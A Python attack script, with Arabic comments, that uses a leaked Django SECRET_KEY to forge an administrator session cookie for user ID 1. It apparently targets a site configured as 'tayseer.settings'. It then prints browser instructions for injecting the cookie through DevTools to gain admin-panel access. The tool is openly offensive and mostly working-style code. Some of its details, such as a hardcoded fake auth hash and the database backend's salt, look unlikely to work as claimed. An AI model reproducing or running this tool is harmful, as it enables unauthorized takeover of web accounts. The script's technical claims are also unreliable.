import os
import django
from django.core import signing
from django.contrib.sessions.serializers import JSONSerializer
from colorama import Fore

class GhostSessionHijacker:
    def __init__(self, leaked_secret_key):
        self.secret_key = leaked_secret_key
        # إعداد بيئة وهمية لـ Django لتوليد التوقيعات
        os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'tayseer.settings')
        self.salt = "django.contrib.sessions.backends.db" # الملح الافتراضي في Django

    def forge_admin_session(self, user_id=1):
        """تزوير جلسة بصلاحيات المدير (Superuser) باستخدام المفتاح المسرب"""
        print(f"{Fore.YELLOW}[*] جاري تزوير جلسة للمستخدم رقم: {user_id} باستخدام SECRET_KEY المسرب...")
        
        # البيانات التي يتوقعها Django داخل الجلسة
        session_dict = {
            '_auth_user_id': str(user_id),
            '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
            '_auth_user_hash': 'forged_hash_by_SayerLinux'
        }

        try:
            # تشفير وتوقيع الجلسة باستخدام المفتاح المسرب
            # التوقيع يتم بنفس خوارزمية Django (TimestampSigner)
            data = signing.dumps(
                session_dict, 
                key=self.secret_key, 
                salt=self.salt, 
                serializer=JSONSerializer, 
                compress=True
            )
            
            print(f"{Fore.GREEN}[🔥 SUCCESS] تم توليد جلسة مزورة بنجاح!")
            print(f"{Fore.WHITE}قيمة الـ Cookie (sessionid): {Fore.CYAN}{data}")
            return data
        except Exception as e:
            print(f"{Fore.RED}[!] خطأ في تزوير الجلسة: {e}")
            return None

    def inject_to_browser(self, session_id):
        """تعليمات لـ SayerLinux لكيفية استخدام الجلسة"""
        print(f"\n{Fore.BLUE}{'='*50}")
        print(f"{Fore.WHITE}كيفية الدخول كمدير:")
        print(f"1. افتح الموقع في المتصفح.")
        print(f"2. افتح DevTools (F12) -> Application -> Cookies.")
        print(f"3. ابحث عن 'sessionid' واستبدل قيمته بـ:")
        print(f"{Fore.YELLOW}{session_id}")
        print(f"4. قم بتحديث الصفحة (Refresh) وستجد نفسك في لوحة التحكم!")
        print(f"{Fore.BLUE}{'='*50}")